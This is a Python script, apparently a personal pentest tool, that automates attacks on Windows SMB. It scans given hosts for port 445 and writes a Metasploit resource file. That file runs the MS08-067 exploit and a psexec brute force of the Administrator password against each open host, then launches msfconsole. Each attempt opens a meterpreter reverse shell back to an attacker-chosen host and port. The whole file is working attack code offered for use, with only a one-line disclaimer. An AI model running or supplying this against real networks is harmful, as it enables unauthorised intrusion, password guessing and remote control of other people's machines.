#!./env/bin/python

""" SMB Brute

    Searches through each host for an open 445 and if they have it then
    add that host to a metasploit config file that attacks smb on 445,
    and sends back a meterpreter shell to lhost on lport. If a password
    file is provided, try brute forcing it if the exploit does not work.

    If list of hosts is not provided, the hosts are read from the stdin

    Don't be a moron, please don't use this for something illegal.

    Usage:
        metasploit_smb.py <hosts> <lhost> <lport> [<password_file>]
        metasploit_smb.py <lhost> <lport> [<password_file>]
        metasploit_smb.py -h | --help
        metasploit_smb.py --version

    Options:
        -h, --help      Display this message
        --version       Display the version of this program

    Examples:
        ./metasploit_smb.py 10.0.0.2,10.0.0.1 127.0.0.1 1337 worldlist/general/common.txt
        ./fping.py subnet 10.0.1.0/24 | ./metasploit_smb.py 127.0.0.1 1337
"""

import os
import sys
import nmap

from docopt import docopt
from nmap_scan import nmap_scan


def setup_handler(config, lhost, lport):
    config.write("use exploit/multi/handler\n")
    config.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    config.write("set LPORT " + str(lport) + "\n")
    config.write("set LHOST " + str(lhost) + "\n")
    config.write("exploit -j -z\n")
    config.write("setg DisablePayloaderHandler 1\n")


def conficker_exploit(config, target, lhost, lport):
    config.write('use exploit/windows/smb/ms08_067_netapi\n')
    config.write('set RHOST ' + str(target) + '\n')
    config.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    config.write('set LPORT ' + str(lport) + '\n')
    config.write('set LHOST ' + str(lhost) + '\n')
    config.write('exploit -j -z\n')


def smb_brute(config, target, password_file, lhost, lport):
    username = 'Administrator'
    pF = open(password_file, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        config.write('use exploit/windows/smb/psexec\n')
        config.write('set SMBUser ' + str(username) + '\n')
        config.write('set SMBPass ' + str(password) + '\n')
        config.write('set RHOST ' + str(target) + '\n')
        config.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        config.write('set LPORT ' + str(lport) + '\n')
        config.write('set LHOST ' + lhost + '\n')
        config.write('exploit -j -z\n')


def main(arguments):
    lhost = arguments['<lhost>']
    lport = arguments['<lport>']
    password_file = arguments['<password_file>']

    targets = []
    scanner = nmap.PortScanner()
    config = open('meta.rc', 'w')

    setup_handler(config, lhost, lport)

    if not arguments['<hosts>']:
        hosts = []
        for line in sys.stdin:
            clear = line.strip('\r').strip('\n')
            hosts.append(clear)

        for host in hosts:
            state = nmap_scan(scanner, host, "445")
            if state:
                if state[2] == "open" or state[2] == "filtered":
                    targets.append(host)

        for target in targets:
            conficker_exploit(config, target, lhost, lport)
            if password_file:
                smb_brute(config, target, password_file, lhost, lport)
    else:
        hosts = arguments['<hosts>'].split(',')

        for host in hosts:
            state = nmap_scan(scanner, host, "445")
            if state:
                if state[2] == "open" or state[2] == "filtered":
                    targets.append(host)

        for target in targets:
            conficker_exploit(config, target, lhost, lport)
            if password_file:
                smb_brute(config, target, password_file, lhost, lport)

    config.close()
    os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    arguments = docopt(__doc__, version=0.1)
    main(arguments)
